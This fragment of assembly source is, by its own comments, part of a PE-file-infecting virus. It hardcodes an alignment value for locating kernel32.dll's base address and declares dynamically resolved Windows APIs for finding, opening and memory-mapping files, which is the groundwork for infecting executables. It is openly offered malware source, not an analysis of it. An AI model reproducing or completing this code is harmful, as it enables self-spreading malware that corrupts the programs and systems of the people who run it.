; PE Section alignment. We only use this hardcoded value for
; finding the base address of kernel32.dll. It seems like a safe
; assumption that this DLL is always present with the standard
; alignment. For infecting PE files we always respect the segment
; alignment declared in the file's header.
PE_SECTION_ALIGNMENT EQU 10000h

; Procedure descriptions for all of the REQUIRED_APIs. Specifying
; these lets the assembler check our argument types and generate 
; the right preamble/postamble for functions the virus resolves
; dynamically at runtime.
DESC_RUNTIME_API GetProcAddress, <baseAddr:DWORD,name:DWORD>
DESC_RUNTIME_API FindFirstFileA, <fileName:DWORD,findData:DWORD>
DESC_RUNTIME_API lstrcpy, <buff:DWORD,szString:DWORD>
DESC_RUNTIME_API FindNextFileA, <handle:DWORD,findData:DWORD>
DESC_RUNTIME_API CreateFileA <file:DWORD,access:DWORD,shareMode:DWORD,secAttrs:DWORD,createDist:DWORD,flags:DWORD,handle:DWORD>
DESC_RUNTIME_API GetFileSize <handle:DWORD,fileSizeHigh:DWORD>
DESC_RUNTIME_API CreateFileMappingA <handle:DWORD,mapAttrs:DWORD,protect:DWORD,sizeHigh:DWORD,sizeLow:DWORD,szName:DWORD>
DESC_RUNTIME_API MapViewOfFile <handle:DWORD,access:DWORD,offsetHigh:DWORD,offsetLow:DWORD,numBytes:DWORD>
DESC_RUNTIME_API UnmapViewOfFile <handle:DWORD>
DESC_RUNTIME_API CloseHandle <handle:DWORD>
DESC_RUNTIME_API GetModuleHandleA <module:DWORD>
DESC_RUNTIME_API ExitProcess <exitCode:DWORD>
